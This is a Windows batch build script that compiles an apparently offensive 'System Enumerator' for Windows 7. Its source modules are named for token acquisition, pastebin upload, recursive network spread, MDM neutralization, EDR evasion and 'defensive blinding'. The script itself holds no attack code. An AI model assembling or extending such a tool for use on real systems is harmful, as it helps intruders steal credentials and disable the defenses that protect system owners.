@echo off
REM Build script for Windows 7 System Enumerator
REM This script builds the enumerator natively on Windows 7 or later
REM For cross-compilation from Linux, use build_win7.sh

echo [ENUMERATOR] Building Windows 7 System Enumerator...

REM Set Windows 7 target flags
set WIN7_FLAGS=/DWINVER=0x0601 /D_WIN32_WINNT=0x0601 /DNTDDI_VERSION=0x06010000

REM Check for MinGW
where gcc >nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [ENUMERATOR] Using MinGW compiler...
    gcc -Wall -Wextra -std=c99 -O2 -static %WIN7_FLAGS% enumerator.c token_acquisition.c progress.c pastebin.c network_recursive.c mdm_detection.c mdm_neutralization.c edr_detection.c edr_evasion.c defensive_blinding.c -o enumerator.exe -static -lws2_32 -liphlpapi -ladvapi32 -lole32 -loleaut32 -lwbemuuid -lwininet -lnetapi32 -lcrypt32 -lwldap32 -lm -lpsapi -lmpr
    if %ERRORLEVEL% == 0 (
        echo [ENUMERATOR] Build successful! Output: enumerator.exe
        echo [ENUMERATOR] Target: Windows 7 compatible
    ) else (
        echo [ENUMERATOR] Build failed!
        exit /b 1
    )
    goto :end
)

REM Check for MSVC
where cl >nul 2>&1
if %ERRORLEVEL% == 0 (
    echo [ENUMERATOR] Using MSVC compiler...
    cl /W4 /O2 /MT %WIN7_FLAGS% /Fe:enumerator.exe enumerator.c token_acquisition.c progress.c pastebin.c network_recursive.c mdm_detection.c mdm_neutralization.c edr_detection.c edr_evasion.c defensive_blinding.c ws2_32.lib iphlpapi.lib advapi32.lib ole32.lib oleaut32.lib wbemuuid.lib wininet.lib netapi32.lib crypt32.lib wldap32.lib psapi.lib mpr.lib
    if %ERRORLEVEL% == 0 (
        echo [ENUMERATOR] Build successful! Output: enumerator.exe
        echo [ENUMERATOR] Target: Windows 7 compatible
        del *.obj 2>nul
    ) else (
        echo [ENUMERATOR] Build failed!
        exit /b 1
    )
    goto :end
)

echo [ENUMERATOR] ERROR: No compiler found! Please install MinGW or MSVC.
exit /b 1

:end
echo [ENUMERATOR] Build complete.
